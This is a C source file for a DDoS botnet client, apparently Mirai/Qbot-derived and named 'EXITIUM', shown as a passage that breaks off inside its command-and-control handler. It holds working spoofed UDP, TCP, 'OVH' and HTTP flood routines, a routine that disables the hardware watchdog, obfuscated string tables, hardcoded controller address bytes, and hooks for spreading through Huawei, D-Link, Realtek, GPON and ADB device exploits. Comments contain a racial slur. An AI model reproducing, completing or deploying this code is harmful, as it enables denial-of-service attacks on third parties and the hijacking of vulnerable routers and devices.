#define _GNU_SOURCE

#include <stdlib.h>
#include <stdarg.h>
#ifdef DEBUG
#include <stdio.h>
#endif
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "s/h/scanner_case.h"

#include "h/x.h"
#include "h/r.h"
#include "h/i.h"
#include "h/k.h"
#define STD2_SIZE 200


#ifdef tellynet
#include "h/s.h"
#endif

#define LST_SZ (sizeof(EXITIUM), sizeof(EXITIUM2), sizeof(EXITIUM3), sizeof(EXITIUM4))
#define RGHT 1
#define ZRO 2
#define PBL 12
#define ST_NM 15
int EXITIUM[] = {185};
int EXITIUM2[] = {244};
int EXITIUM3[] = {25};
int EXITIUM4[] = {149};
int port = 8555;
// user agent for the http attack
void UserAgents1(void)
{
t_u_v(TABLE_HTTP_1);
t_u_v(TABLE_HTTP_2);
t_u_v(TABLE_HTTP_3);
t_u_v(TABLE_HTTP_4);
t_u_v(TABLE_HTTP_5);
t_u_v(TABLE_HTTP_6);
t_u_v(TABLE_HTTP_7);
t_u_v(TABLE_HTTP_8);
t_u_v(TABLE_HTTP_9);
t_u_v(TABLE_HTTP_10);
t_u_v(TABLE_HTTP_11);
t_u_v(TABLE_HTTP_12);
t_u_v(TABLE_HTTP_13);
t_u_v(TABLE_HTTP_14);
t_u_v(TABLE_HTTP_15);
t_u_v(TABLE_HTTP_16);
t_u_v(TABLE_HTTP_17);
t_u_v(TABLE_HTTP_18);
t_u_v(TABLE_HTTP_19);
t_u_v(TABLE_HTTP_20);
t_u_v(TABLE_HTTP_21);
t_u_v(TABLE_HTTP_22);
t_u_v(TABLE_HTTP_23);
t_u_v(TABLE_HTTP_24);
t_u_v(TABLE_HTTP_25);
t_u_v(TABLE_HTTP_26);
t_u_v(TABLE_HTTP_27);
t_u_v(TABLE_HTTP_28);
t_u_v(TABLE_HTTP_29);
t_u_v(TABLE_HTTP_30);
t_u_v(TABLE_HTTP_31);
t_u_v(TABLE_HTTP_32);
t_u_v(TABLE_HTTP_33);
t_u_v(TABLE_HTTP_34);




t_r_v(TABLE_HTTP_1, NULL);
t_r_v(TABLE_HTTP_2, NULL);
t_r_v(TABLE_HTTP_3, NULL);
t_r_v(TABLE_HTTP_4, NULL);
t_r_v(TABLE_HTTP_5, NULL);
t_r_v(TABLE_HTTP_6, NULL);
t_r_v(TABLE_HTTP_7, NULL);
t_r_v(TABLE_HTTP_8, NULL);
t_r_v(TABLE_HTTP_9, NULL);
t_r_v(TABLE_HTTP_10, NULL);
t_r_v(TABLE_HTTP_11, NULL);
t_r_v(TABLE_HTTP_12, NULL);
t_r_v(TABLE_HTTP_13, NULL);
t_r_v(TABLE_HTTP_14, NULL);
t_r_v(TABLE_HTTP_15, NULL);
t_r_v(TABLE_HTTP_16, NULL);
t_r_v(TABLE_HTTP_17, NULL);
t_r_v(TABLE_HTTP_18, NULL);
t_r_v(TABLE_HTTP_19, NULL);
t_r_v(TABLE_HTTP_20, NULL);
t_r_v(TABLE_HTTP_21, NULL);
t_r_v(TABLE_HTTP_22, NULL);
t_r_v(TABLE_HTTP_23, NULL);
t_r_v(TABLE_HTTP_24, NULL);
t_r_v(TABLE_HTTP_25, NULL);
t_r_v(TABLE_HTTP_26, NULL);
t_r_v(TABLE_HTTP_27, NULL);
t_r_v(TABLE_HTTP_28, NULL);
t_r_v(TABLE_HTTP_29, NULL);
t_r_v(TABLE_HTTP_30, NULL);
t_r_v(TABLE_HTTP_31, NULL);
t_r_v(TABLE_HTTP_32, NULL);
t_r_v(TABLE_HTTP_33, NULL);
t_r_v(TABLE_HTTP_34, NULL);


t_l_v(TABLE_HTTP_1);
t_l_v(TABLE_HTTP_2);
t_l_v(TABLE_HTTP_3);
t_l_v(TABLE_HTTP_4);
t_l_v(TABLE_HTTP_5);
t_l_v(TABLE_HTTP_6);
t_l_v(TABLE_HTTP_7);
t_l_v(TABLE_HTTP_8);
t_l_v(TABLE_HTTP_9);
t_l_v(TABLE_HTTP_10);
t_l_v(TABLE_HTTP_11);
t_l_v(TABLE_HTTP_12);
t_l_v(TABLE_HTTP_13);
t_l_v(TABLE_HTTP_14);
t_l_v(TABLE_HTTP_15);
t_l_v(TABLE_HTTP_16);
t_l_v(TABLE_HTTP_17);
t_l_v(TABLE_HTTP_18);
t_l_v(TABLE_HTTP_19);
t_l_v(TABLE_HTTP_20);
t_l_v(TABLE_HTTP_21);
t_l_v(TABLE_HTTP_22);
t_l_v(TABLE_HTTP_23);
t_l_v(TABLE_HTTP_24);
t_l_v(TABLE_HTTP_25);
t_l_v(TABLE_HTTP_26);
t_l_v(TABLE_HTTP_27);
t_l_v(TABLE_HTTP_28);
t_l_v(TABLE_HTTP_29);
t_l_v(TABLE_HTTP_30);
t_l_v(TABLE_HTTP_31);
t_l_v(TABLE_HTTP_32);
t_l_v(TABLE_HTTP_33);
t_l_v(TABLE_HTTP_34);

}

int EXITIUMSock = 0, SRV = -1, gotIP = 0, ioctl_pid = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t CMWC(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void KeepAlive(void) {
    ioctl_pid = fork();
    if (ioctl_pid > 0 || ioctl_pid == -1)
        return;
    int timeout = 1, ioctl_fd = 0, found = FALSE;
    t_u_v(XOR_IOCTL_WATCH1);
    t_u_v(XOR_IOCTL_WATCH2);
    if ((ioctl_fd = open(t_r_v(XOR_IOCTL_WATCH1, NULL), 2)) != -1 ||
        (ioctl_fd = open(t_r_v(XOR_IOCTL_WATCH2, NULL), 2)) != -1) {
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }
    if (found) {
        while (TRUE) {
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    t_l_v(XOR_IOCTL_WATCH1);
    t_l_v(XOR_IOCTL_WATCH2);

}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;

    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}



uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    t_u_v(XOR_RANDOM);
    char *alphaset = t_r_v(XOR_RANDOM, NULL);

    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_cmwc();;

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_cmwc() % (sizeof (alphaset));
            len--;
        }
    }
    t_l_v(XOR_RANDOM);
}

static void printchar(unsigned char **str, int c) {
    if (str) {
        **str = c;
        ++(*str);
    } else (void) write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & ZRO) padchar = '0';
    }
    if (!(pad & RGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }
    for (; *string; ++string) {
        printchar(out, *string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }
    return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PBL];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }
    s = print_buf + PBL - 1;
    *s = '\0';

    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if (width && (pad & ZRO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (; *format != 0; ++format) {
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = RGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= ZRO;
            }
            for (; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            if (*format == 's') {
                t_u_v(XOR_NULL);
                register char *s = (char *) va_arg(args, int);
                pc += prints(out, s ? s : t_r_v(XOR_NULL, NULL), width, pad);
                t_l_v(XOR_NULL);
                continue;
            }
            if (*format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if (*format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if (*format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'c') {
                scr[0] = (unsigned char) va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            out:
            printchar(out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end(args);
    return pc;
}

int SZP(unsigned char *out, const unsigned char *format, ...) {
    va_list args;
    va_start(args, format);
    return print(&out, format, args);
}

int EXITIUMonPrint(int sock, char *formatStr, ...) {
    unsigned char *textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);
    char *orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args);
    va_end(args);
    orig[strlen(orig)] = '\n';
    int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}

int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if ((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}

void MRS(unsigned char *buf, int length) {
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (CMWC() % (91 - 65)) + 65;
}

int recvLine(int socket, unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);

    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&myset);
    FD_SET(socket, &myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
        while (retryCount < 10) {

            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
                retryCount++;
                continue;
            }

            break;
        }
    }

    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;

    cp = buf;
    while (bufsize-- > 1) {
        if (recv(EXITIUMSock, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if (tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
    return count;
}

int connectTimeout(int fd, char *host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(host, &dest_addr.sin_addr)) return 0;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    int res = connect(fd, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd + 1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void *) (&valopt), &lon);
                if (valopt) return 0;
            } else return 0;
        } else return 0;
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);

    return 1;
}

int listFork() {
    uint32_t parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t *) malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

in_addr_t GRI(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ (CMWC() & ~netmask);
}

unsigned short csum(unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) {
        sum += *(unsigned char *) buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc((size_t) totaltcp_len);
    memcpy((unsigned char *) tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *) tcp + sizeof(struct tcp_pseudo), (unsigned char *) tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void MIP(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = CMWC();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}




char *GB() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "1";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "2";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "3";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "4"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "5";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "6";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "7";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "8";
    #elif defined(__sh__)
    return "9";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "10";
    #elif defined(__sparc__) || defined(__sparc)
    return "11";
    #elif defined(__m68k__)
    return "12";
    #elif defined(__arc__)
    return "13";
    #else
    return "0";
    #endif
}



#ifdef xrep
void lets_rep(void)
{
    #ifdef DEBUG
        printf("\n[rep init] generating integer and detecting CPUs\n");
    #endif
    int repint = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
    
    srand(time(NULL));
    repint = rand() % 100;
    
    #ifdef DEBUG
        printf("\n[rep init] integer and processor generated [ int: %d | CPUs: %d ]\n", repint, processors);
    #endif
    //well nigga we are gona start on primary prosses case 1 2 3 4 all the sreps that are there well be seen depending
    //on the cpu usage
    // if not found we bail out strange thinking right there 
    
    if(processors > 0)
    {
    #ifdef DEBUG
            printf("\n[rep init] %d processors detected, starting case 1\n", processors);
    #endif
    //well nigga we are gona start on primary_alt_prosses prosses case 1 all the sreps that are here
    #ifdef huawei
    huawei_case();
    #endif
    #ifdef dlink
    dlink_case();
    #endif
    #ifdef realtek
    realtek_case();
    #endif
    #ifdef adb
    adb_case();
    #endif
    #ifdef linksys
    linksys_case();
    #endif
    #ifdef gpon80
    gpon80_case();
    #endif
        } else if(75 > repint > 50)
    {
    #ifdef DEBUG
      printf("\n[rep init] %d processors detected, starting case 2\n", processors);
    #endif
    // well nigga we are gona start on alt_prosses prosses case 2 all the sreps that are here
    #ifdef huawei
    huawei_case();
    #endif
    #ifdef dlink
    dlink_case();
    #endif
    #ifdef realtek
    realtek_case();
    #endif
    #ifdef linksys
    linksys_case();
    #endif
    #ifdef tellynet
    tellynet_case();
    #endif
      } else if(100 > repint > 76)
    {
    #ifdef DEBUG
      printf("\n[rep init] %d processors detected, starting case 3\n", processors);
    #endif
    // well nigga we are gona start on medium prosses case 3 all the sreps that are here
    #ifdef huawei
    huawei_case();
    #endif
    #ifdef tellynet
    tellynet_case();
    #endif
    #ifdef realtek
    realtek_case();
    #endif
    #ifdef adb
    adb_case();
    #endif
    //scanner_init();
    } else if(49 > repint)
    {
    #ifdef DEBUG
      printf("\n[rep init] %d processors detected, starting case 4\n", processors);
    #endif
    // well nigga we are gona start on low prosses case 4 all the sreps that are here
   
    #ifdef huawei
    huawei_case();
    #endif
    #ifdef tellynet
    tellynet_case();
    #endif
    
    }
    
}
#endif



char *exploits() {
    #if defined(huawei)
    return "101";
    #elif defined(linksys)
    return "102";
    #elif defined(tenda)
    return "103";
    #elif defined(gpon8080)
    return "104"
    #elif defined(gpon80)
    return "105";
    #elif defined(gpon443)
    return "106";
    #elif defined(uchttpd)
    return "107";
    #elif defined(coap)
    return "108";
     #elif defined(adb)
    return "109";
    #elif defined(realtek)
    return "1010";
     #elif defined(dlink)
    return "111";
    #endif
}

void SUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval) {
    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = CMWC();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    register unsigned int pollRegister;
    pollRegister = pollinterval;

    if (spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (!sockfd) {
            return;
        }

        unsigned char *buf = (unsigned char *) malloc(packetsize + 1);
        if (buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        MRS(buf, packetsize);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while (1) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

            if (i == pollRegister) {
                if (port == 0) dest_addr.sin_port = CMWC();
                if (time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (!sockfd) {
            return;
        }

        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
            return;
        }

        int counter = 50;
        while (counter--) {
            srand(time(NULL) ^ CMWC());
            init_rand(rand());
        }

        in_addr_t netmask;

        if (spoofit == 0) netmask = (~((in_addr_t) - 1));
        else netmask = (~((1 << (32 - spoofit)) - 1));

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *) packet;
        struct udphdr *udph = (void *) iph + sizeof(struct iphdr);

        MIP(iph, dest_addr.sin_addr.s_addr, htonl(GRI(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

        udph->len = htons(sizeof(struct udphdr) + packetsize);
        udph->source = CMWC();
        udph->dest = (port == 0 ? CMWC() : htons(port));
        udph->check = 0;

        MRS((unsigned char *) (((unsigned char *) udph) + sizeof(struct udphdr)), packetsize);

        iph->check = csum((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while (1) {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

            udph->source = CMWC();
            udph->dest = (port == 0 ? CMWC() : htons(port));
            iph->id = CMWC();
            iph->saddr = htonl(GRI(netmask));
            iph->check = csum((unsigned short *) packet, iph->tot_len);

            if (i == pollRegister) {
                if (time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
        }
    }
}

void STCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize,
          int pollinterval) {
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = CMWC();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (!sockfd) {
        return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        return;
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (void *) iph + sizeof(struct iphdr);

    MIP(iph, dest_addr.sin_addr.s_addr, htonl(GRI(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = CMWC();
    tcph->seq = CMWC();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    if (!strcmp(flags, "A")) {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    }

    tcph->window = CMWC();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? CMWC() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while (1) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

        iph->saddr = htonl(GRI(netmask));
        iph->id = CMWC();
        tcph->seq = CMWC();
        tcph->source = CMWC();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *) packet, iph->tot_len);

        if (i == pollRegister) {
            if (time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

void ovhflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        MIP(iph, dest_addr.sin_addr.s_addr, htonl( GRI(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        tcph->urg = 1;

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( GRI(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}



int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, 0);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

void stdfl00d(unsigned char *ip, int port, int secs) {
  int iSTD_Sock;
  iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
  time_t start = time(NULL);
  struct sockaddr_in sin;
  struct hostent * hp;
  hp = gethostbyname(ip);
  bzero((char * ) & sin, sizeof(sin));
  bcopy(hp->h_addr, (char * ) & sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = port;
  unsigned int a = 0;
  while (1) {
    if (a >= 50) {
      char name_buf[32];
      int name_buf_len;
      name_buf_len = ((rand_cmwc() % 4) + 3) * 4;
      rand_alphastr(name_buf, name_buf_len);
      name_buf[name_buf_len] = 0;
      char *stdstring = name_buf;
      send(iSTD_Sock, stdstring, STD2_SIZE, 0);
      connect(iSTD_Sock, (struct sockaddr * ) & sin, sizeof(sin));
      if (time(NULL) >= start + secs) {
        close(iSTD_Sock);
        _exit(0);
      }
      a = 0;
    }
    a++;
  }
}


// im gay
void httphex(char *host, in_port_t port, int timeEnd, int power, char *method)
{
    int socket, socket2, i, end = time(NULL) + timeEnd, sendIP = 0;
    char choosepath[1024];
    char request[512], buffer[1];
    const char *methods[] = {"GET", "HEAD", "POST"};
    char *UserAgents =  UserAgents1;
;{
    }
    
    for (i = 0; i < power; i++)
    {
        
        if(!strcmp(method, "RANDOM"))
        {
            sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", methods[(rand() % 3)], choosepath, host, UserAgents[(rand() % 5)]);
        }
        else if (!strcmp(method, "CF"))
        {
            sprintf(request, "GET /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", methods[(rand() % 3)], host, UserAgents[(rand() % 5)]);
        }
        else
        {
            sprintf(request, "%s /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, choosepath, host, UserAgents[(rand() % 5)]);
        }
        
        
        if (fork())
        {
            while (end > time(NULL))
            {
                socket = socket_connect(host, port);
                if (socket != 0)
                {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            //exit(0);
        }
    }
}


void CnC(int argc, unsigned char *argv[]) {
if (!strcmp(argv[0], "H"))
    {
        if (argc < 5 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) return;
        if (listFork()) return;
        httphex(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), argv[5]);
        //exit(0);
    }

    if (!strcmp(argv[0], "U")) {
